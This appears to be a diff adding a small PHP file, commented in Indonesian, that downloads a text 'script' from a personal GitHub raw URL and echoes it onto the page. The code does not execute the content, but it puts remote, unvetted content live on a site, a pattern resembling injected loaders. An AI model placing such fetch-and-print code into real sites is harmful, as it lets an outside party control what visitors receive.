@@ -1,0 +1,19 @@
+<?php
+$url = 'https://raw.githubusercontent.com/claracinta/t3/refs/heads/main/lembata2.txt';  // Ganti dengan URL yang diinginkan
+
+// Membuat konteks stream untuk menambahkan pengaturan seperti user-agent atau timeout
+$options = [
+    'http' => [
+        'method'  => 'GET',
+        'header'  => "User-Agent: PHP\r\n"  // Menambahkan header User-Agent agar server menerima permintaan
+    ]
+];
+
+$context = stream_context_create($options);
+$response = file_get_contents($url, false, $context);
+
+if ($response === false) {
+    echo "Gagal mendownload skrip.";
+} else {
+    echo "Skrip berhasil didownload:\n" . $response;
+}
